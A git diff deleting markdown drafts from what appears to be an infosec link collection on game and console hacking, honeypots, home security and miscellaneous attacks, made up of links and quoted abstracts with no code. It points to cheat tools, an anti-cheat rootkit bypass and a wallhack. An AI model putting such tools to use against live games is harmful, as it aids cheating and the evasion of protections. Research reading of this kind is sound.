-### <a name="general"></a>General
-* [Introduction to Server Side Emulation - Corillian - tuts4you](https://tuts4you.com/download.php?view.2758)
-* [The Ultimate Online Game Hacking Resource](https://github.com/dsasmblr/hacking-online-games)
-	* From dissecting game clients to cracking network packet encryption, this is a go-to reference for those interested in the topic of hacking online games.
-
-
-
-------------
-#### <a name="writeups"></a>Writeups
-* [How do emulators work and how are they written?](https://stackoverflow.com/questions/448673/how-do-emulators-work-and-how-are-they-written)
-* [Reverse Engineering Strike Commander](http://fabiensanglard.net/reverse_engineering_strike_commander/index.php)
-* [Remote Code Execution In Source Games](https://oneupsecurity.com/research/remote-code-execution-in-source-games?t=r)
-* [Gotta catch-em-all worldwide - Pokemon GO GPS spoofing](https://insinuator.net/2016/07/gotta-catch-em-all-worldwide-or-how-to-spoof-gps-to-cheat-at-pokemon-go/)
-* [Creating a Packet Logger for Dragomon Hunter](https://0xbaadf00dsec.blogspot.com/2016/01/reverse-engineering-online-games.html)
-* [Hack the Vote CTF "The Wall" Solution](https://zerosum0x0.blogspot.com/2016/11/hack-vote-wall-solution.html)
-* [How to hack an MMO - Raph Koster - 2008](https://www.raphkoster.com/2008/04/17/how-to-hack-an-mmo/)
-
-### <a name="console"></a>Console Hacking
-
-#### Nintendo Gameboy
-* [Reverse engineering a Gameboy ROM with radare2](https://www.megabeets.net/reverse-engineering-a-gameboy-rom-with-radare2/)
-
-
-
-#### Nintendo 3DS
-* [Keyshuffling Attack for Persistent Early Code Execution in the Nintendo 3DS Secure Bootchain](https://github.com/Plailect/keyshuffling)
-	* We demonstrate an attack on the secure bootchain of the Nintendo 3DS in order to gain early code execution. The attack utilizes the block shuffling vulnerability of the ECB cipher mode to rearrange keys in the Nintendo 3DS's encrypted keystore. Because the shuffled keys will deterministically decrypt the encrypted firmware binary to incorrect plaintext data and execute it, and because the device's memory contents are kept between hard reboots, it is possible to reliably reach a branching instruction to a payload in memory. This payload, due to its execution by a privileged processor and its early execution, is able to extract the hash of hardware secrets necessary to decrypt the device's encrypted keystore and set up a persistant exploit of the system.
-* [ARM9Loader Technical Details - GBAtemp](https://gbatemp.net/threads/arm9loader-technical-details-and-discussion.408537/)
-* [Throwback: K9Lhax by Bruteforce](http://douevenknow.us/post/151129092928/throwback-k9lhax-by-bruteforce)
-
-
-
-------------
-#### Nintendo Wii 
-* [wiihacks forum](http://www.wiihacks.com/)
-* [WiiHacks](https://www.reddit.com/r/WiiHacks/)
-
-
-------------
-#### PSP / PS Vita
-* [Hacking the PS Vita](http://yifan.lu/2015/06/21/hacking-the-ps-vita/)
-* [ Playstation Portable Cracking [24c3]](https://www.youtube.com/watch?v=TgzxyO2QO1M)
-
-
-
-------------
-### PC Games
-* [TruePlay - msdn](https://msdn.microsoft.com/en-us/library/windows/desktop/mt808781(v=vs.85).aspx)
-* [Valve Anti-Cheat Untrusted Bans (VAC) CSGO](http://dev.cra0kalo.com/?p=521)
-* [Hacking the Source Engine](http://vallentinsource.com/hacking-source-engine)
-* [How ESEA detects cheat software in its online gaming league - Let's get physical!](http://everdox.blogspot.com/2015/02/how-esea-detects-cheat-software-in-its.html)
-	* Before we dig in, this post should not be construed as an attack on ESEA, anti-cheat software, or fair gaming in general. It is simply an analysis thereof, detailing what the ESEA driver does on your machine. Although analysis will make attack vectors clear and obvious, no code or detailed explanation of how to leverage these points will be given.
-* [Inside Blizzard: Battle.net](http://uninformed.org/?v=all&a=8&t=sumry)
-	* This paper intends to describe a variety of the problems Blizzard Entertainment has encountered from a practical standpoint through their implementation of the large-scale online game matchmaking and chat service, Battle.net. The paper provides some background historical information into the design and purpose of Battle.net and continues on to discuss a variety of flaws that have been observed in the implementation of the system. Readers should come away with a better understanding of problems that can be easily introduced in designing a matchmaking/chat system to operate on such a large scale in addition to some of the serious security-related consequences of not performing proper parameter validation of untrusted clients. 
-* [An Objective Analysis of the Lockdown Protection System for Battle.net](http://uninformed.org/?v=all&a=40&t=sumry)
-	* Near the end of 2006, Blizzard deployed the first major update to the version check and client software authentication system used to verify the authenticity of clients connecting to Battle.net using the binary game client protocol. This system had been in use since just after the release of the original Diablo game and the public launch of Battle.net. The new authentication module (Lockdown) introduced a variety of mechanisms designed to raise the bar with respect to spoofing a game client when logging on to Battle.net. In addition, the new authentication module also introduced run-time integrity checks of client binaries in memory. This is meant to provide simple detection of many client modifications (often labeled "hacks") that patch game code in-memory in order to modify game behavior. The Lockdown authentication module also introduced some anti-debugging techniques that are designed to make it more difficult to reverse engineer the module. In addition, several checks that are designed to make it difficult to simply load and run the Blizzard Lockdown module from the context of an unauthorized, non-Blizzard-game process. After all, if an attacker can simply load and run the Lockdown module in his or her own process, it becomes trivially easy to spoof the game client logon process, or to allow a modified game client to log on to Battle.net successfully. However, like any protection mechanism, the new Lockdown module is not without its flaws, some of which are discussed in detail in this paper.
-
-
-------------
-### <a name="re"></a>RE
-
-
-------------
-### <a name="talks">Talks & Presentations</a>
-* [+1,000,000 -0: Cloning a Game Using Game Hacking and Terabytes of Data](https://github.com/nickcano/gamehackingpres2016)
-	* In this talk, I'll provide a window into the warchest my team used to generate over a million lines of code. In particular, we created and used game hacks to process data from tens of millions of hours of in-game data and use the results to generate copies of a game's map, monsters, quests, items, spells, non-playable characters, and more. We also used a wiki crawler to obtain a large amount of data, generate additional code, and guide our cheat scripts in what to look for, clarify, and ignore. After explaining our end-game vision, I'll dive deep into the architecture of the game client, server and protocol. Once that's out of the way, I'll talk about the different types of hacks we used, how they work, and what data they were able to obtain. Once that's out of the way, I'll round out the story by explaining exactly what type of data we gathered and what parts of our toolkit we used to gather it.
-* [The Multibillion Dollar Industry That's Ignored](http://www.irongeek.com/i.php?page=videos/derbycon4/t204-the-multibillion-dollar-industry-thats-ignored-jason-montgomery-and-ryan-sevey)
-* [Creating A Kewl And Simple Cheating Platform On Android - DeepSec2014](http://www.securitytube.net/video/12547?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed%3A+SecurityTube+%28SecurityTube.Net%29)
-* [DEFCON 17: Fragging Game Servers - Bruce Potter](https://www.youtube.com/watch?v=SooVvF9qO_k&app=desktop)
-
-
-
-
-------------
-### <a name="tools"></a>Tools
-
-[Pince](https://github.com/korcankaraokcu/PINCE)
-* PINCE is a gdb front-end/reverse engineering tool focused on games, but it can be used for any reverse-engineering related stuff. PINCE is an abbreviation for "PINCE is not Cheat Engine". PINCE's GUI is heavily "inspired(;D)" by Cheat Engine. 
-
-[ugtrain](https://github.com/ugtrain/ugtrain)
-* Universal Elite Game Trainer for CLI(linux game trainer)
-
-[CSGOSimple](https://github.com/MarkHC/CSGOSimple)
-* A simple base for internal Counter-Strike: Global Offensive cheats.
-
-[NoEye](https://github.com/Schnocker/NoEye)
-* An usermode BE Rootkit Bypass
-
-[PubgPrivXcode85](https://github.com/TonyZesto/PubgPrivXcode85)
-* Simple chams wallhack for Player Unknowns Battlegrounds using a D3D11DrawIndexed hook
-
-[PortAIO-Loader](https://github.com/PirateEmpire/PortAIO-Loader) 
-
-
-
-
---------------
-### <a name="hacked"></a>Games meant to be Hacked
-* [PwnAdventureZ](https://github.com/Vector35/PwnAdventureZ)
-	* NES zombie survival game made to be hacked 
-
-
-
-
-
-
diff --git a/Draft/Home Security.md b/Draft/Home Security.md
deleted file mode 100755
index 7168a43..0000000
--- a/Draft/Home Security.md	
+++ /dev/null
@@ -1,26 +0,0 @@
-##Home Security & Defense
-
-Anchored window covers
-
-
-[Home Alone with localhost - Automating Home Defense - Chris Littlebury Defcon22](https://www.youtube.com/watch?v=9Tbft190x3Q)
-
-
-[Physical Home Security Options - DiabloHorn](https://diablohorn.wordpress.com/2014/07/13/physical-home-security-options/#more-984)
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
diff --git a/Draft/Honeypots.md b/Draft/Honeypots.md
deleted file mode 100755
index e55fc99..0000000
--- a/Draft/Honeypots.md
+++ /dev/null
@@ -1,181 +0,0 @@
-## Honeypots
-
-
-
-
-
-### TOC
-
-* Cull
-* [General](#general)
-* [Honeypots/nets](#honey)
-* [Presentations](#talks)
-* [Tools](#tools)
-* [Write-ups](#writeup)
-* [Papers](#papers)
-
-
-
-###Cull
-
-http://www.cuckoosandbox.org/
-
-http://highaltitudehacks.com/2013/06/15/ghost-usb-honeypot-part-2-installing-and-running-the-honeypot/
-
-[Honeypot Farming: Setup Modern Honey Network](https://medium.com/@theroxyd/honeypot-farming-setup-mhn-f07d241fcac6)
-
-[honeyLambda](https://github.com/0x4D31/honeyLambda)
-* a simple, serverless application designed to create and monitor URL {honey}tokens, on top of AWS Lambda and Amazon API Gateway
-
-[Masarah Paquet-Clouston & Olivier Bilodeau - Attacking Linux Moose Unraveled an Ego Market](https://www.youtube.com/watch?v=8c8C5cHbRU0&list=PLuUtcRxSUZUpv2An-RNhjuZSJ5fjY7ghe&index=2)
-
-#### End Cull
-
-
-
-
-
---------
-### <a name="general"></a>General
-* [Honeypots - ShadowServer](https://www.shadowserver.org/wiki/pmwiki.php/Information/Honeypots)
-* [Honeypot Computing - Wikipedia](https://en.wikipedia.org/wiki/Honeypot_%28computing%29)
-
-##### Types:
-```
-* Zero
-* Low
-* Medium
-* High
-* HoneyData - Strings, shares/drives, etc.
-```
-
---------
-### <a name="honey">Honeypots/nets</a>
-* [Modern Honey Network(MHN)](https://threatstream.github.io/mhn/)
-	* From the secure deployment to the aggregation of thousands of events MHN provides enteprise grade management of the most current open source honeypot software. MHN is completely free open source software which supports external and internal honeypot deployments at a large and distributed scale. MHN uses the HPFeeds standard and low-interaction honeypots to keep effectiveness and security at enterprise grade levels. MHN provides full REST API out of the box and we are making CEF and STIX support available now for direct SIEM integration through our Commercial platform Optic. 
-* [Beeswarm](http://www.beeswarm-ids.org/)
-	* Beeswarm is a honeypot project which provides easy configuration, deployment and managment of honeypots. Beeswarm operates by deploying fake end-user systems (clients) and services (honeypots). Beeswarm uses these systems to provides IoC (Indication of Compromise) by observing the difference between expected and actual traffic. 
-	* [Github](https://github.com/honeynet/beeswarm)
-* [Honeywall Project](https://projects.honeynet.org/honeywall/)
-	* The goal of this page is to provide you the latest documentation, source code, distribution, and information for the Honeynet Project's Honeywall CDROM. The Honeywall CDROM is a bootable CD that installs onto a hard drive and comes with all the tools and functionality for you to implement data capture, control and analysis. 
-* [PSHITT](https://github.com/regit/pshitt)
-	* pshitt (for Passwords of SSH Intruders Transferred to Text) is a lightweight fake SSH server designed to collect authentication data sent by intruders. It basically collects username and password used by SSH bruteforce software and writes the extracted data to a file in JSON format. pshitt is written in Python and use paramiko to implement the SSH layer.
-* [Omnivora](http://sourceforge.net/projects/omnivora/)
-	* Omnivora is a low-interaction honeypot for systems running Windows operating systems and is implemented using Borland Delphi. It is primarily designed to collect autonomous spreading malware.
-* [dionea](http://dionaea.carnivore.it/)
-	* dionaea intention is to trap malware exploiting vulnerabilities exposed by services offerd to a network, the ultimate goal is gaining a copy of the malware. 
-* [Kippo](https://github.com/desaster/kippo)
-	* Kippo is a medium interaction SSH honeypot designed to log brute force attacks and, most importantly, the entire shell interaction performed by the attacker.
-* [Glastopf Project](http://glastopf.org/)
-	* Glastopf is a Honeypot which emulates thousands of vulnerabilities to gather data from attacks targeting web applications. The principle behind it is very simple: Reply the correct response to the attacker exploiting the web application. The project has been kicked off by Lukas Rist in 2009 and the results we are got during this time are very promising and are an incentive to put even more effort in the development of this unique tool. Read the tool description for further information. We are working together with different people, organizations and institutions to get the best from the collected data. Find out more about collaborating with the project. 
-* [Amun](http://sourceforge.net/projects/amunhoney/)
-	* Amun is a low-interaction honeypot, like Nepenthes or Omnivora, designed to capture autonomous spreading malware in an automated fashion. Amun is written in Python and therefore allows easy integration of new features.
-* [PHP-ShockPot](https://github.com/leonjza/PHP-ShockPot)
-	* PHP-ShockPot is a small honeypot aimed at showing you the interesting attempts made trying to exploit your host using the now famous "Shellshock" (also known as bashbug) bug.
-* [Google Hack Honeypot GHH](http://ghh.sourceforge.net/)
-	*  Google Hack Honeypot is the reaction to a new type of malicious web traffic: search engine hackers. GHH is a ?Google Hack? honeypot. It is designed to provide reconaissance against attackers that use search engines as a hacking tool against your resources. GHH implements honeypot theory to provide additional security to your web presence.  Google has developed a powerful tool. The search engine that Google has implemented allows for searching on an immense amount of information. The Google index has swelled past 8 billion pages [February 2005] and continues to grow daily. Mirroring the growth of the Google index, the spread of web-based applications such as message boards and remote administrative tools has resulted in an increase in the number of misconfigured and vulnerable web apps available on the Internet.  These insecure tools, when combined with the power of a search engine and index which Google provides, results in a convenient attack vector for malicious users. GHH is a tool to combat this threat. 
-* [iNetSim](http://www.inetsim.org/)
-	* INetSim is a software suite for simulating common internet services in a lab environment, e.g. for analyzing the network behaviour of unknown malware samples. 
-* [Thug - Python low-interaction honeyclient](https://buffer.github.io/thug/)
-	* Thug is a Python low-interaction honeyclient aimed at mimicing the behavior of a web browser in order to detect and emulate malicious contents. 
-* [elastichoney](https://github.com/jordan-wright/elastichoney)0
-	* Elastichoney is a simple elasticsearch honeypot designed to catch attackers exploiting RCE vulnerabilities in elasticsearch.
-* [romanHunter](http://sourceforge.net/projects/romanhunter/)
-	* romanHunter (router man Hunter) is a wireless honeypot or closer to a sinkhole that will bait a cracker, capture the MAC address, reset the WIFI password (effectively destroying their connection) and wait for the next authorized connection.  The password changes happen on a round robin basis from entries in the password file (pw_list.txt).
-* [Wordpot](https://github.com/gbrindisi/wordpot)
-	* Wordpot is a Wordpress honeypot which detects probes for plugins, themes, timthumb and other common files used to fingerprint a wordpress installation.
-* [Honeyagent](https://bitbucket.org/fkie_cd_dare/honeyagent)
-	* HoneyAgent is a Java agent library that creates a Sandbox for Java applications and applets. Therefore, it uses the JVMTI as well as the JNI to intercept class loading and function calls. During runtime HoneyAgent traces function calls from the analysed application. It is displayed which class calles which function with which parameters. Reflected function calls are translated to the original function names for simpler reading.
-* [HoneyBadger](https://bitbucket.org/LaNMaSteR53/honeybadger)
-	* A framework for targeted geolocation.
-* [Amun Honeypot](https://github.com/zeroq/amun)
-	* [Amun Honeypot Paper](https://ub-madoc.bib.uni-mannheim.de/2595/1/amunhoneypot2.pdf)
-* [phpmyadmin_honeypot](https://github.com/gfoss/phpmyadmin_honeypot)
-	* Probably one of the smallest and simplest web honeypots out there...
-* [Web Labyrinth](https://github.com/mayhemiclabs/weblabyrinth)
-	* A simple tool that creates a maze of bogus web pages to  confuse web scanners. It's main goal is to delay and occupy malicious  scanners that scan websites in order for incident handlers to detected  and respond to them before damage is done.
-* [Web Bug Server](http://sourceforge.net/p/adhd/wiki/Web%20Bug%20Server/)
-	* Easily embed a web bug inside word processing documents. These bugs are hidden to the casual observer by using things like linked style sheets and 1 pixel images.
-* [Truman](http://www.secureworks.com/cyber-threat-intelligence/tools/truman/)
-	* Truman can be used to build a "sandnet", a tool for analyzing malware in an environment that is isolated, yet provides a virtual Internet for the malware to interact with. It runs on native hardware, therefore it is not stymied by malware which can detect VMWare and other VMs. The major stumbling block to not using VMs is the difficulty involved with repeatedly imaging machines for re-use. Truman automates this process, leaving the researcher with only minimal work to do in order to get an initial analysis of a piece of malware. Truman consists of a Linux boot image (originally based on Chas Tomlin's Windows Image Using Linux) and a collection of scripts. Also provided is pmodump, a Perl-based tool to reconstruct the virtual memory space of a process from a PhysicalMemory dump. With this tool it is possible to circumvent most packers to perform strings analysis on the dumped malware.
-* [Static Low-interaction Honeypots](http://www.frameloss.org/2014/07/12/static-low-interaction-honeypots/)
-
-
-
-
-
-
-
-
-
-
-
-
-
-
---------
-### <a name="tools"></a>Tools
-* [DCEPT](https://github.com/secureworks/dcept) - A tool for deploying and detecting use of Active Directory honeytokens 
-* [Hflow2](https://projects.honeynet.org/hflow) - Data Analysis System
-* [Tango Honeypot Intelligence](https://github.com/aplura/Tango) - Honeypot Intelligence with Splunk
-
-
-
-
-
-
-
-
-
-
-
---------
-### <a name="talks"></a>Presentations
-* [Honeypots for Active Defense - A Practical Guide to Deploying Honeynets Within the Enterprise - Greg Foss](http://www.irongeek.com/i.php?page=videos/centralohioinfosec2015/tech201-honeypots-for-active-defense-a-practical-guide-to-deploying-honeynets-within-the-enterprise-greg-foss)
-	* InfoSec analysts are all somewhat familiar with honeypots. When they are given the proper attention, care and feeding, they produce invaluable information. This intelligence has been primarily used by security researchers and organizations with advanced defensive capabilities to study their adversaries and learn from their actions. But what about the rest of us? Honeypots are a lot of work to configure, maintain, and monitor -- how can an organization that is not focused on research gain valuable intelligence using honeypots and actively defend their network using the data obtained? The answer is honeypots for active defense. There are currently many open source security tool distributions that come pre-loaded with honeypots among other useful tools, however the honeypot software is often not deployed in an effective manner. This session will discuss techniques to deploy honeypots in ways that will not overburden the security team with massive logs to sift through and focuses on correlating active threat data observed in the honeypot with the production environment. When deploying honeypots effectively, this can give security analysts one additional mechanism to tip them off to nefarious activity within their network.
-* [Global Honeypot Trends - Elliot Brink](https://www.youtube.com/watch?v=rjd-r4WA0PU)
-	* Many of my computer systems are constantly compromised, attacked, hacked, 24/7. How do I know this? I've been allowing it. This presentation will cover over one year of research running several vulnerable systems (or honeypots) in multiple countries including the USA, mainland China, Russia and others. We'll be taking a look at: a brief introduction to honeypots, common attacker trends (both sophisticated and script kiddie), brief malware analysis and the statistical analysis of attackers based on GeoIP. Are there differences in attacks based on where a computer system is located? Let's investigate this together! Beginners to the topic of honeypots fear not, the basics will be covered.
-* [Security Onions and Honey Potz - Ethan Dodge - BSidesSLC2015](https://www.youtube.com/watch?v=1Jbm1zwiGTM)
-
-
-
-
-
-
-
-
-
-
-
-
-
-
---------
-### <a name="writeup">Writeups</a>
-* [Deploying Dionaea on a Raspberry Pi using MHN](https://github.com/threatstream/mhn/wiki/Deploying-Dionaea-on-a-Raspberry-Pi)
-* [Experimenting with Honeypots Using The Modern Honey Network](https://zeltser.com/modern-honey-network-experiments/)
-* [Building a Honeypot to Research Cyber-Attack Techniques](https://www.sussex.ac.uk/webteam/gateway/file.php?name=bell-proj.pdf&site=20)
-* [Lessons Learn from attacks on Kippo honeypots](https://isc.sans.edu/diary/Lessons+Learn+from+attacks+on+Kippo+honeypots/18935)
-* [An in-depth analysis of SSH attacks on Amazon EC2](https://blog.secdim.com/in-depth-analysis-of-ssh-attacks-on-amazon-ec2/)
-	* The research study investigates Secure Shell (SSH) attacks on Amazon EC2 cloud instances across different AWS zones by means of deploying Smart Honeypot (SH). It provides an in-depth analysis of SSH attacks, SSH intruders profile, and attempts to identify their tactics and purposes.
-
---------
-### <a name="paper">Papers</a>
-* [Analysis of Attacks Using a Honeypot - Verlag Berlin Heidelberg 2011]()
-	* Abstract. A Honeypot is a software based security device, deployed to attract hackers by displaying services and open ports which are potentially vulnerable. While the attackers are diverted, t heir activities can then be monitored and an a- lysed to identify current a ttack methods and trends. A low - interaction Honeypot called Dion aea was chosen for this project because it can simulate services while preventing an attacker from gaining full control. Results were collected over the six week period of the experiment. The logged information of the o b- served attacks was analysed and compared with current vulnerabilities, the loc a- tions where the attacks were originating from and the time of day at the orig i- nating site. A profile of individual attackers can then be built to ga in an insight into the current attack trends in order to improve network defences.
-* [POSTER: Dragging Attackers to Honeypots for Effective Analysis of Cyber Threats](http://www.aims-conference.org/2014/POSTER-Dragging_Attackers_to_Honeypots_for_Effective_Analysis_of_Cyber_Threats.pdf)
-* [Setting Honeytraps with Modsecurity - Adding fake hidden form fields](http://blog.spiderlabs.com/2014/06/setting-honeytraps-with-modsecurity-adding-fake-hidden-form-fields.html)
-
-
-
-
-
-
-
-
-
-
-
-
-
-
diff --git a/Draft/Interesting Things Useful stuff.md b/Draft/Interesting Things Useful stuff.md
deleted file mode 100755
index 8e50842..0000000
--- a/Draft/Interesting Things Useful stuff.md	
+++ /dev/null
@@ -1,490 +0,0 @@
-# Interesting Things & Useful Stuff
-
-### TOC
-* [Attribution](#attribution)
-* [News/Reports](#news)
-* [General](#general)
-* [Tamper Evidence](#tamper)
-* [General Interesting things that aren't neccessarily infosec related](#notinfo)
-* [Interesting Talks & Videos](#talks)
-* [Interesting & Useful Attacks](#attacks)
-* [Interesting & Useful Papers](#papers)
-* [Interesting & Useful Hardware Projects](#hwprojects)
-* [Interesting & Useful Software](#software))
-* [Interesting & Useful Write-ups](#writeup)
-* [Simulators](#sim)
-* [Screen Scraping](#scrape)
-* [Various Purpose Based OS's](#purpose)
-* change all the above.
-
-
-
-
-
-
-
-
-
-
-#### To Sort
-* sort and break into policy/high level/ vs interesting things
-http://spth.virii.lu/articles.htm
-* [Virtualization Based Security - Part 2: kernel communications](http://blog.amossys.fr/virtualization-based-security-part2.html)
-* [Binary SMS - The old backdoor to your new thing](https://www.contextis.com/resources/blog/binary-sms-old-backdoor-your-new-thing/)
-* [A Sysadmin's Unixersal Translator (ROSETTA STONE)](http://bhami.com/rosetta.html)
-* [Windows Firewall Control - Managing Windows Firewall is now easier than ever](https://www.binisoft.org/wfc.php)
-[OSX for Hackers (Mavericks/Yosemite)](https://gist.github.com/matthewmueller/e22d9840f9ea2fee4716)
-[What Colour are your bits?](http://ansuz.sooke.bc.ca/entry/23)
-
-#### End Sort
-
-
-
-
-
-
-
-----------------------
-### <a name="general"></a>General Articles
-* This is why we can't have nice things -> [VBScript Injection via GNOME Thumbnailer - On Linux](http://news.dieweltistgarnichtso.net/posts/gnome-thumbnailer-msi-fail.html)
-* [Hamming - You and your research](https://www.youtube.com/watch?v=a1zDuOPkMSw)
-* [Your Project from Idea to Reality](http://www.slideshare.net/maltman23/your-project-from-idea-to-reality)
-* [Windows Commands Abused by Attackers](http://blog.jpcert.or.jp/2016/01/windows-commands-abused-by-attackers.html)
-* [The Distribution of Users’ Computer Skills: Worse Than You Think](https://www.nngroup.com/articles/computer-skill-levels/)
-* [Infosec Podcasts](http://www.getmon.com/)
-* [THE BASIC LAWS OF HUMAN STUPIDITY - Carlo M. Cipolia](http://harmful.cat-v.org/people/basic-laws-of-human-stupidity/)
-
-Airplanes
-* [NTSB Aviation Accident Database & Synopses](https://www.ntsb.gov/_layouts/ntsb.aviation/index.aspx)
-* [The Aviation Herald](https://avherald.com/)
-* [radar - securitywizardy](http://www.securitywizardry.com/radar.htm)
-* [Real-life experiences in avionics security assessment (A. Barisani)](https://www.youtube.com/watch?v=xtSmPgXw34I&feature=youtu.be&app=desktop)
-
-Attacking
-[It’s all about the timing. . . Blackhat talk](https://www.blackhat.com/presentations/bh-usa-07/Meer_and_Slaviero/Whitepaper/bh-usa-07-meer_and_slaviero-WP.pdf)
-	* Description: This paper is broken up into several distinct parts, all related loosely to timing and its role in information se- curity today. While timing has long been recognized as an important component in the crypt-analysts arse- nal, it has not featured very prominently in the domain of Application Security Testing. This paper aims at highlighting some of the areas in which timing can be used with great effect, where traditional avenues fail. In this paper, a brief overview of previous timing attacks is provided, the use of timing as a covert channel is examined and the effectiveness of careful timing during traditional web application and SQL injection attacks is demonstrated. The use of Cross Site Timing in bypass- ing the Same Origin policy is explored as we believe the technique has interesting possibilities for turning innocent browsers into bot-nets aimed at, for instance, brute-force attacks against third party web-sites
-* [A Look In the Mirror: Attacks on Package Managers](https://isis.poly.edu/~jcappos/papers/cappos_mirror_ccs_08.pdf)
-* [VM as injection payload ](http://infiltratecon.com/downloads/python_deflowered.pdf)
-* [Thousands of MongoDB installations on the net unprotected](http://cispa.saarland/wp-content/uploads/2015/02/MongoDB_documentation.pdf)
-* [Exploiting the DRAM rowhammer bug to gain kernel privileges](http://googleprojectzero.blogspot.com/2015/03/exploiting-dram-rowhammer-bug-to-gain.html)
-	* "Rowhammer” is a problem with some recent DRAM devices in which repeatedly accessing a row of memory can cause bit flips in adjacent rows. We tested a selection of laptops and found that a subset of them exhibited the problem. We built two working privilege escalation exploits that use this effect. One exploit uses rowhammer-induced bit flips to gain kernel privileges on x86-64 Linux when run as an unprivileged userland process. When run on a machine vulnerable to the rowhammer problem, the process was able to induce bit flips in page table entries (PTEs). It was able to use this to gain write access to its own page table, and hence gain read-write access to all of physical memory.
-* [Program for testing for the DRAM "rowhammer" problem](https://github.com/google/rowhammer-test)
-* [DRAMA: Exploiting DRAM Addressing for Cross-CPU Attacks](https://arxiv.org/abs/1511.08756)
-* [Breaking IPMI/BMC](http://fish2.com/ipmi/how-to-break-stuff.html)
-* [The Evolution of Protected Processes Part 1: Pass-the-Hash Mitigations in Windows 8.1](http://www.alex-ionescu.com/?p=97)
-* [The Geometry of Innocent Flesh on the Bone: Return-into-libc without Function Calls (on the x86)](https://cseweb.ucsd.edu/~hovav/dist/geometry.pdf)
-	* We present new techniques that allow a return-into-libc attack to be mounted on x86 executables that calls no functions at all. Our attack combines a large number of short instruction sequences to build gadgets that allow arbitrary computation. We show how to discover such instruction sequences by means of static analysis. We make use, in an essential way, of the properties of the x86 instruction set.
-* [Ultimate beginners guide to phreaking v3.2 - 1999](http://web.textfiles.com/phreak/phreaking.txt)
-
-
-Attribution
-* [Cyber Attack Attribution Report](http://whohackedus.com/)
-* [NSARCHIVE - The Cyber Vault](http://nsarchive.gwu.edu/cybervault/)
-	* An online resource documenting cyber activities of the U.S. and foreign governments as well as international organizations.
-* [IPew Attack Map](http://ocularwarfare.com/ipew/)
-
-
-
-Barcodes
-* [Simplifying the Business Bar Coded Boarding Pass Implementation Guide](http://www.iata.org/whatwedo/stb/documents/bcbp_implementation_guidev4_jun2009.pdf)
-* [What’s contained in a boarding pass barcode?](https://shaun.net/posts/whats-contained-in-a-boarding-pass-barcode)
-* [QR Code interesting](http://datagenetics.com/blog/november12013/index.html)
-* [ClearImage Free Online Barcode Reader / Decoder](http://online-barcode-reader.inliteresearch.com/)
-[Decoding Small QR-Codes by hand](http://blog.qartis.com/decoding-small-qr-codes-by-hand/)
-* [QR Inception: Barcode-in-Barcode Attacks](https://www.sba-research.org/wp-content/uploads/publications/qrinception.pdf)
-	* 2D barcodes offer many benefits compared to 1D barcodes, such as high information density and robustness. Before their introduction to the mobile phone ecosystem, they have been widely used in specific applications, such as logistics or ticketing. However, there are multiple competing standards with different benefits and drawbacks. Therefore, reader applications as well as dedicated devices have to support multiple standards. In this paper, we present novel attacks based on deliberately caused ambiguities when especially crafted barcodes conform to multiple standards. Implementation details decide which standard the decoder locks on. This way, two users scanning the same barcode with different phones or apps will receive different content. This potentially opens way for multiple problems related to security. We describe how embedding one barcode symbology into another can be used to perform phishing attacks as well as targeted exploits. In addition, we evaluate the extent to which popular 2D barcode reader applications on smartphones are susceptible to these barcode-in-barcode attacks. We furthermore discuss mitigation techniques against this type of attack.
-
-
-Breaches
-* [Alexsey’s TTPs](https://medium.com/@chrismcnab/alexseys-ttps-1204d9050551#.y2krgov7t)
-	* Short writeup on large breaches(Short: Shit ain't secure.)
-* 
-
-
-Code Search Engines
-* [symbolhound](http://symbolhound.com/)
-	* SymbolHound is a search engine that doesn't ignore special characters. This means you can easily search for symbols like &, %, and p. We hope SymbolHound will help programmers-------- find information about their chosen languages and frameworks more easily.
-* [grokbit](https://grokbit.com/)
-	* Code search engine
-
-Crypto
-* [RSA Key Extraction via Low-Bandwidth Acoustic Cryptanalysis](http://www.tau.ac.il/~tromer/acoustic/)
-	* Here, we describe a new acoustic cryptanalysis key extraction attack, applicable to GnuPG's current implementation of RSA. The attack can extract full 4096-bit RSA decryption keys from laptop computers (of various models), within an hour, using the sound generated by the computer during the decryption of some chosen ciphertexts. We experimentally demonstrate that such attacks can be carried out, using either a plain mobile phone placed next to the computer, or a more sensitive microphone placed 4 meters away.
-* [Get Your Hands Off My Laptop: Physical Side-Channel Key-Extraction Attacks On PCs](http://www.tau.ac.il/~tromer/handsoff/)
-	* We demonstrated physical side-channel attacks on a popular software implementation of RSA and ElGamal, running on laptop computers. Our attacks use novel side channels and are based on the observation that the "ground" electric potential in many computers fluctuates in a computation-dependent way. An attacker can measure this signal by touching exposed metal on the computer's chassis with a plain wire, or even with a bare hand. The signal can also be measured at the remote end of Ethernet, VGA or USB cables. Through suitable cryptanalysis and signal processing, we have extracted 4096-bit RSA keys and 3072-bit ElGamal keys from laptops, via each of these channels, as well as via power analysis and electromagnetic probing. Despite the GHz-scale clock rate of the laptops and numerous noise sources, the full attacks require a few seconds of measurements using Medium Frequency signals (around 2 MHz), or one hour using Low Frequency signals (up to 40 kHz).
-
-
-
-
-Databases
-* [NIST National Vulnerability Database](https://nvd.nist.gov/ncp/repository)
-* [List of disposable email domains](https://github.com/martenson/disposable-email-domains)
-
-
-Educational
-* [Underhanded C contest](http://underhanded-c.org/)
-* [DIY Nukeproofing: A New Dig at “Data-Mining”](https://media.defcon.org/DEF%20CON%2023/DEF%20CON%2023%20presentations/DEFCON-23-3alarmlampscooter-DIY-Nukeproofing.pdf)
-
-
-
-
-
-General Computation
-* [Introduction to Resource Oriented Computing - Whitepaper](http://resources.1060research.com/docs/IntroductionToResourceOrientedComputing-1.pdf)
-* [Detecting Automation of Twitter Accounts: Are You a Human, Bot, or Cyborg](http://www.cs.wm.edu/~hnw/paper/tdsc12b.pdf)
-* [A Tale of Two Kernels: Towards Ending Kernel Hardening Wars with Split Kernel](http://split.kernel.build/papers/ccs14.pdf)
-	* Abstract: Software security practitioners are often torn between choosing per- formance or security. In particular, OS kernels are sensitive to the smallest performance regressions. This makes it difficult to develop innovative kernel hardening mechanisms: they may inevitably incur some run-time performance overhead. Here, we propose building each kernel function with and without hardening, within a single split kernel . In particular, this allows trusted processes to be run under unmodified kernel code, while system calls of untrusted pro- cesses are directed to the hardened kernel code. We show such trusted processes run with no overhead when compared to an un- modified kernel. This allows deferring the decision of making use of hardening to the run-time. This means kernel distributors, system administrators and users can selectively enable hardening accord- ing to their needs: we give examples of such cases. Although this approach cannot be directly applied to arbitrary kernel hardening mechanisms, we show cases where it can. Finally, our implementa- tion in the Linux kernel requires few changes to the kernel sources and no application source changes. Thus, it is both maintainable and easy to use
